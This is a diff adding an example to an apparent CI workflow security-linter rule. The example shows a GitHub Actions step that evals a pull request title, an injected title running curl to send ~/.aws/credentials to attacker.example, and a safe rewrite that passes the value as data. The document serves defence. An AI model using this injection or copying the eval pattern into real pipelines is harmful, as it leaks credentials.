@@ -46,6 +46,31 @@ RULE = Rule(
         "only fires when the substituted command references a "
         "variable.",
     ),
+    exploit_example=(
+        "# Vulnerable: a PR-title-shaped env value is re-parsed as\n"
+        "# shell. A PR titled\n"
+        "#   ; curl -d @~/.aws/credentials https://attacker.example\n"
+        "# turns the eval line into a credential exfiltration step.\n"
+        "jobs:\n"
+        "  build:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - uses: actions/checkout@<sha>\n"
+        "      - env:\n"
+        "          DEPLOY_CMD: ${{ github.event.pull_request.title }}\n"
+        "        run: eval \"$DEPLOY_CMD\"\n"
+        "\n"
+        "# Safe: pass the value as data, not code. ``deploy`` reads\n"
+        "# stdin; metacharacters in the title stay literal.\n"
+        "jobs:\n"
+        "  build:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - uses: actions/checkout@<sha>\n"
+        "      - env:\n"
+        "          DEPLOY_LABEL: ${{ github.event.pull_request.title }}\n"
+        "        run: ./scripts/deploy --label-from-env DEPLOY_LABEL"
+    ),
 )
 
 
